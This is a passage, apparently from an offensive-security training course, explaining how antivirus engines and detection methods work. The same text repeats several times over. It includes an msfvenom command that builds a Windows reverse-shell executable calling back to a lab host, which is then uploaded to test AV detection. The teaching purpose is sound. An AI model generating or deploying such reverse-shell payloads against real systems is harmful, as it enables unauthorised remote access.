Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

